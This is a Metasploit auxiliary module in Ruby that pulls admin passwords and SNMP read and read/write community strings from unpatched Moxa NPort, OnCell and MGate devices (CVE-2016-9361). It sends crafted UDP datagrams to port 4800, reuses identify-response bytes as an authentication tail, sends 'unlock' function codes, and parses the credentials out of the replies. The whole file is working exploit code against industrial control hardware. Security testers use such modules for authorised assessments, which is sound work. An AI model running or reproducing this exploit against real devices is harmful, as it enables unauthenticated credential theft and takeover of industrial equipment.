##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Moxa Device Credential Retrieval',
      'Description'    => %q{
        The Moxa protocol listens on 4800/UDP and will respond to broadcast
        or direct traffic.  The service is known to be used on Moxa devices
        in the NPort, OnCell, and MGate product lines.  Many devices with
        firmware versions older than 2017 or late 2016 allow admin credentials
        and SNMP read and read/write community strings to be retrieved without
        authentication.

        This module is the work of Patrick DeSantis of Cisco Talos and K. Reid
        Wightman.

        Tested on: Moxa NPort 6250 firmware v1.13, MGate MB3170 firmware 2.5,
        and NPort 5110 firmware 2.6.

      },
      'Author'         =>
        [
          'Patrick DeSantis <p[at]t-r10t.com>',
          'K. Reid Wightman <reid[at]revics-security.com>'
        ],

      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2016-9361'],
          [ 'BID', '85965'],
          [ 'URL', 'https://www.digitalbond.com/blog/2016/10/25/serial-killers/'],
          [ 'URL', 'https://github.com/reidmefirst/MoxaPass/blob/master/moxa_getpass.py' ],
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-16-336-02']
        ],
      'DisclosureDate' => 'Jul 28 2015'))

    register_options([
      # Moxa protocol listens on 4800/UDP by default
      Opt::RPORT(4800),
      OptEnum.new("FUNCTION", [true, "Pull credentials or enumerate all function codes", "CREDS",
        [
          "CREDS",
          "ENUM"
        ]])
      ])
  end

  def fc() {
    # Function codes
    'ident'         =>  "\x01",   # identify device
    'name'          =>  "\x10",   # get the "server name" of the device
    'netstat'       =>  "\x14",   # network activity of the device
    'unlock1'       =>  "\x16",   # "unlock" some devices, including 5110, MGate
    'date_time'     =>  "\x1a",   # get the device date and time
    'time_server'   =>  "\x1b",   # get the time server of device
    'unlock2'       =>  "\x1e",   # "unlock" 6xxx series devices
    'snmp_read'     =>  "\x28",   # snmp community strings
    'pass'          =>  "\x29",   # admin password of some devices
    'all_creds'     =>  "\x2c",   # snmp comm strings and admin password of 6xxx
    'enum'          =>  "enum"    # mock fc to catch "ENUM" option
  }
  end

  def send_datagram(func, tail)
    if fc[func] == "\x01"
      # identify datagrams have a length of 8 bytes and no tail
      datagram = fc[func] + "\x00\x00\x08\x00\x00\x00\x00"
      begin
        udp_sock.put(datagram)
        response = udp_sock.get(3)
      rescue ::Timeout::Error
      end
      format_output(response)
      # the last 16 bytes of the ident response are used as a form of auth for
      # function codes other than 0x01
      tail = response[8..24]
    elsif fc[func] == "enum"
      for i in ("\x02".."\x80") do
        # start at 2 since 0 is invalid and 1 is ident
        datagram = i + "\x00\x00\x14\x00\x00\x00\x00" + tail
        begin
          udp_sock.put(datagram)
          response = udp_sock.get(3)
        end
        if response[1] != "\x04"
          vprint_status("Function Code: #{Rex::Text.to_hex_dump(datagram[0])}")
          format_output(response)
        end
      end
    else
      # all non-ident datagrams have a len of 14 bytes and include a tail that
      # is comprised of bytes obtained during the ident
      datagram = fc[func] + "\x00\x00\x14\x00\x00\x00\x00" + tail
      begin
        udp_sock.put(datagram)
        response = udp_sock.get(3)
        if valid_resp(fc[func], response) == -1
          # invalid response, so don't bother trying to parse it
          return
        end
        if fc[func] == "\x2c"
          # try this, note it may fail
          get_creds(response)
        end
        if fc[func] == "\x29"
        # try this, note it may fail
        get_pass(response)
        end
        if fc[func] == "\x28"
        # try this, note it may fail
        get_snmp_read(response)
        end
      rescue ::Timeout::Error
      end
      format_output(response)
    end
  end

  # helper function for extracting strings from payload
  def get_string(data)
    str_end = data.index("\x00")
    return data[0..str_end]
  end

  # helper function for extracting password from 0x29 FC response
  def get_pass(response)
    if response.length() < 200
      print_error("get_pass failed: response not long enough")
      return
    end
    pass = get_string(response[200..-1])
    print_good("password retrieved: #{pass}")
    store_loot("moxa.get_pass.admin_pass", "text/plain", rhost, pass)
    return pass
  end

  # helper function for extracting snmp community from 0x28 FC response
  def get_snmp_read(response)
    if response.length() < 24
      print_error("get_snmp_read failed: response not long enough")
      return
    end
    snmp_string = get_string(response[24..-1])
    print_good("snmp community retrieved: #{snmp_string}")
    store_loot("moxa.get_pass.snmp_read", "text/plain", rhost, snmp_string)
  end

  # helper function for extracting snmp community from 0x2C FC response
  def get_snmp_write(response)
    if response.length() < 64
      print_error("get_snmp_write failed: response not long enough")
      return
    end
    snmp_string = get_string(response[64..-1])
    print_good("snmp read/write community retrieved: #{snmp_string}")
    store_loot("moxa.get_pass.snmp_write", "text/plain", rhost, snmp_string)
  end

  # helper function for extracting snmp and pass from 0x2C FC response
  # Note that 0x2C response is basically 0x28 and 0x29 mashed together
  def get_creds(response)
    if response.length() < 200
      # attempt failed. device may not be unlocked
      print_error("get_creds failed: response not long enough. Will fall back to other functions")
      return -1
    end
    get_snmp_read(response)
    get_snmp_write(response)
    get_pass(response)
  end

  # helper function to verify that the response was actually for our request
  # Simply makes sure the response function code has most significant bit
  # of the request number set
  # returns 0 if everything is ok
  # returns -1 if functions don't match
  def valid_resp(func, resp)
    # get the query function code to an integer
    qfc = func.unpack("C")[0]
    # make the response function code an integer
    rfc = resp[0].unpack("C")[0]
    if rfc == (qfc + 0x80)
      return 0
    else
      return -1
    end
  end

  def format_output(resp)
    # output response bytes as hexdump
    vprint_status("Response:\n#{Rex::Text.to_hex_dump(resp)}")
  end
  def check
    connect_udp

    begin
      # send the identify command
      udp_sock.put("\x01\x00\x00\x08\x00\x00\x00\x00")
      response = udp_sock.get(3)
    end

    if response
      # A valid response is 24 bytes, starts with 0x81, and contains the values
      # 0x00, 0x90, 0xe8 (the Moxa OIU) in bytes 14, 15, and 16.
      if response[0] == "\x81" && response[14..16] == "\x00\x90\xe8" && response.length == 24
        format_output(response)
        return Exploit::CheckCode::Appears
      end
    else
      vprint_error("Unknown response")
      return Exploit::CheckCode::Unknown
    end
    cleanup

    Exploit::CheckCode::Safe
  end

  def run
    unless check == Exploit::CheckCode::Appears
      print_error("Aborted because the target does not seem vulnerable.")
      return
    end

    function = datastore["FUNCTION"]

    connect_udp

    # identify the device and get bytes for the "tail"
    tail = send_datagram('ident', nil)

    # get the "server name" from the device
    send_datagram('name', tail)

    # "unlock" the device
    # We send both versions of the unlock FC, this doesn't seem
    # to hurt anything on any devices tested
    send_datagram('unlock1', tail)
    send_datagram('unlock2', tail)

    if function == "CREDS"
      # grab data
      send_datagram('all_creds', tail)
      send_datagram('snmp_read', tail)
      send_datagram('pass', tail)
    elsif function == "ENUM"
      send_datagram('enum', tail)
    else
      print_error("Invalid FUNCTION")
    end

    disconnect_udp
  end
end
